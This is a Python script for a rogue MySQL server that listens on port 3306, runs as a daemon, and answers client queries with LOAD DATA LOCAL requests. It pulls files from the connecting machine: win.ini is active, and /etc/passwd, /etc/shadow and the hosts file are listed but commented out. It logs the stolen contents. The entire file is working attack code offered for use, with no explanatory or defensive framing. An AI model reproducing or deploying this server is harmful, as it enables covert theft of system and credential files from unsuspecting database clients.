#coding: utf8


import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers



PORT = 3306

log = logging.getLogger(__name__)

log.setLevel(logging.DEBUG)
tmp_format = logging.handlers.WatchedFileHandler(&#039;mysql.log&#039;, &#039;ab&#039;)
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
#    r&#039;c:\boot.ini&#039;,
    r&#039;c:\windows\win.ini&#039;,
#    r&#039;c:\windows\system32\drivers\etc\hosts&#039;,
#    &#039;/etc/passwd&#039;,
#    &#039;/etc/shadow&#039;,
)


#================================================
#=======No need to change after this lines=======
#================================================

__author__ = &#039;Gifts&#039;

def daemonize():
    import os, warnings
    if os.name != &#039;posix&#039;:
        warnings.warn(&#039;Cant create daemon on non-posix system&#039;)
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open(&#039;/dev/null&#039;, os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct(&#039;<Hbb&#039;)
    packet_header_long = struct.Struct(&#039;<Hbbb&#039;)
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = &#039;LEN&#039;
        self.sub_state = &#039;Auth&#039;
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    &#039;\x0a&#039;,  # Protocol
                    &#039;3.0.0-Evil_Mysql_Server&#039; + &#039;\0&#039;,  # Version
                    #&#039;5.1.66-0+squeeze1&#039; + &#039;\0&#039;,
                    &#039;\x36\x00\x00\x00&#039;,  # Thread ID
                    &#039;evilsalt&#039; + &#039;\0&#039;,  # Salt
                    &#039;\xdf\xf7&#039;,  # Capabilities
                    &#039;\x08&#039;,  # Collation
                    &#039;\x02\x00&#039;,  # Server Status
                    &#039;\0&#039; * 13,  # Unknown
                    &#039;evil2222&#039; + &#039;\0&#039;,
                ))
            )
        )

        self.order = 1
        self.states = [&#039;LOGIN&#039;, &#039;CAPS&#039;, &#039;ANY&#039;]

    def push(self, data):
        log.debug(&#039;Pushed: %r&#039;, data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug(&#039;Data recved: %r&#039;, data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == &#039;LEN&#039;:
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = &#039;Data&#039;
            else:
                self.state = &#039;MoreLength&#039;
        elif self.state == &#039;MoreLength&#039;:
            if data[0] != &#039;\0&#039;:
                self.push(None)
                self.close_when_done()
            else:
                self.state = &#039;Data&#039;
        elif self.state == &#039;Data&#039;:
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == &#039;\x03&#039;:
                        log.info(&#039;Query&#039;)

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            &#039;\xFB{0}&#039;.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = &#039;LEN&#039;
                        self.sub_state = &#039;File&#039;
                        self.push(PACKET)
                    elif packet.payload[0] == &#039;\x1b&#039;:
                        log.info(&#039;SelectDB&#039;)
                        self.push(mysql_packet(
                            packet,
                            &#039;\xfe\x00\x00\x02\x00&#039;
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in &#039;\x02&#039;:
                        self.push(mysql_packet(
                            packet, &#039;\0\0\0\x02\0\0\0&#039;
                        ))
                        raise LastPacket()
                    elif packet.payload == &#039;\x00\x01&#039;:
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == &#039;File&#039;:
                        log.info(&#039;-- result&#039;)
                        log.info(&#039;Result: %r&#039;, data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, &#039;\0\0\0\x02\0\0\0&#039;)
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = &#039;LEN&#039;
                            self.order = packet.packet_num + 1

                    elif self.sub_state == &#039;Auth&#039;:
                        self.push(mysql_packet(
                            packet, &#039;\0\0\0\x02\0\0\0&#039;
                        ))
                        raise LastPacket()
                    else:
                        log.info(&#039;-- else&#039;)
                        raise ValueError(&#039;Unknown packet&#039;)
            except LastPacket:
                log.info(&#039;Last packet&#039;)
                self.state = &#039;LEN&#039;
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning(&#039;Out of order&#039;)
                self.push(None)
                self.close_when_done()
        else:
            log.error(&#039;Unknown state&#039;)
            self.push(&#039;None&#039;)
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind((&#039;&#039;, PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info(&#039;Conn from: %r&#039;, pair[1])
            tmp = http_request_handler(pair)


z = mysql_listener()
daemonize()
asyncore.loop()

